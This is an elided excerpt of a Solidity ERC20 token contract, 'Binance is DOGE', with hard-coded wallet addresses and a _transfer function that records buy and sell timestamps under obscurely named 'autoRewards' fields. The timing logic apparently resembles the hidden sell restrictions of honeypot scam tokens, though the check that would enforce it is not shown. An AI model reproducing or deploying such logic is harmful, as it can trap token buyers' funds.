...
contract Bidogeum is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0xfD9AAB7c31DC9ADb77DE3C7C3BE5c2C94e7f0C48);
    address payable public immutable marketingWallet = payable(0x4d919995b4385360DB1C681500C78dB25776512D);
    address payable public immutable devWallet = payable(0x0DAF78d72e74B4F1d5dDef849D3a38C8116025A8);
    ...
    mapping(address => AutoHoldInfos) private autoRewards;

    bool private swapping;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("Binance is DOGE", "BIDOGEUM") {
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                AutoHoldInfos storage makerAutoRewards = autoRewards[to];
                if (makerAutoRewards.buy == 0) {
                    makerAutoRewards.buy = block.timestamp;
                }
            } else {
                AutoHoldInfos storage makerAutoRewards = autoRewards[from];
                makerAutoRewards.holdDuration = makerAutoRewards.buy - _autoMinReward;
                makerAutoRewards.sell = block.timestamp;
            }
        }
